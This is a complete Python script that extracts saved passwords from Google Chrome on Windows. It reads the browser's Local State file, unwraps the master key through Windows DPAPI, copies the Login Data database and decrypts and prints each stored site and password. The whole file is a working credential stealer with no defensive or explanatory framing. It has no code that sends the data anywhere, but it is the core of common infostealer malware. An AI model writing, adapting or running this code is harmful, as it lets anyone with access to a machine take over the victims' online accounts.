import os, json, base64, sqlite3, win32crypt, shutil
from Cryptodome.Cipher import AES

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r"Appdata\Local\Google\Chrome\User Data\Local State", "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        cipher = generate_cipher(master_key, iv)
        decrypted_password = decrypt_payload(cipher, buff[15:])
        decrypted_password = decrypted_password[:-16].decode('utf-8')
        return decrypted_password
    except Exception as e:
        return "Chrome < 80"

if __name__ == '__main__':
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r"Appdata\Local\Google\Chrome\User Data\default\Login Data"
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")

    c = conn.cursor()
    try:
        # retrieve password and usernames from the database
        c.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in c.fetchall():
            url = r[0]
            username = r[1]
            # decrypt the password using the masterkey
            decrypted_password = decrypt_password(r[2], master_key)
            if len(username) > 0:
                print("[+] " + url + " -> " + decrypted_password)
    except Exception as e:
        pass

    c.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except:
        pass
